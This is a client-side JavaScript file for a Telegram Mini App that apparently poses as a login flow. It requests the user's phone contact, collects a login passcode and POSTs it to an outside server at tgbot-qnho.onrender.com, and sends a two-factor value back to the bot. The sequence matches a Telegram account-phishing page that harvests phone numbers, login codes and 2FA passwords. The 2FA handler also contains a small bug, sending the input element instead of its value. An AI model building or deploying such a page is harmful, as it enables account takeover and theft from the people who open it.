document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;

    let page = 'page1';

    const loginBtn = document.getElementById('loginbtn');
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const blur = document.getElementById('blur');
    const TEST = document.getElementById('TEST');
    const passcodeBtn = document.getElementById('passcode-btn');
    const passcodeInput = document.getElementById('hiddenInput');
    const twofactorInput = document.getElementById('twofactor-input');

    loginBtn.addEventListener('click', async () => {
        try {
            tg.requestContact();
            tg.onEvent('contactRequested', (data) => {
                if (data.status === 'sent') {
                    showPage2();
                }
            });
        } catch (error) {
            console.log('[ERROR]: ' + error);
        }
    });
    function showPage2() {
        page = 'page2';
        page2.style.display = 'flex';
        requestAnimationFrame(() => {
            page2.style.transform = 'translateY(0)';
        });
        blur.style.zIndex = '0';
        page2.style.zIndex = '100';
        blur.style.opacity = '1';
        loginbtn.style.display = 'none';
    }

    blur.addEventListener('click', () => {
        if (page === 'page2') {
            blur.style.zIndex = '-1';
            page2.style.display = 'none';
            blur.style.opacity = '0';
            loginbtn.style.display = 'flex';
            page = 'page1';

            requestAnimationFrame(() => {
                page2.style.transform = 'translateY(40px)';
            });
        }
    });

    passcodeBtn.addEventListener('click', () => {
        // page2.style.transform = 'translate(-50%, 40px)';
        fetch('https://tgbot-qnho.onrender.com/api/data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                passcode: passcodeInput.value,
            }),
        });
        page2.style.display = 'none';

        // tg.sendData(JSON.stringify(passcodeInput.value));

        // setTimeout(() => {
        //     page2.style.display = 'none';

        //     page3.style.display = 'flex';
        //     requestAnimationFrame(() => {
        //         page3.style.transform = 'translate(0)';
        //         page3.style.opacity = '1';
        //     });
        // }, 200);
    });

    const twofactorBtn = document.getElementById('twofactor-btn');
    twofactorBtn.addEventListener('click', () => {
        const value = twofactorInput;
        tg.sendData(
            JSON.stringify({ action: 'twofactor_value', value: value })
        );
    });

    const input = document.getElementById('hiddenInput');
    const cells = document.querySelectorAll('.cell');
    const box = document.getElementById('codeBox');

    box.addEventListener('click', () => input.focus());

    input.addEventListener('input', () => {
        const value = input.value.split('');
        cells.forEach((cell, i) => (cell.textContent = value[i] || ''));
        cells.forEach((cell, i) => {
            if (value[i]) {
                requestAnimationFrame(() => {
                    cell.style.boxShadow = '0 0 0.3rem 0.1rem #59be4a';
                });
            } else {
                cell.style.boxShadow = 'none';
            }
        });
        if (input.value.length >= input.maxLength) {
            input.blur(); // removes focus → hides keyboard
        }
    });
});
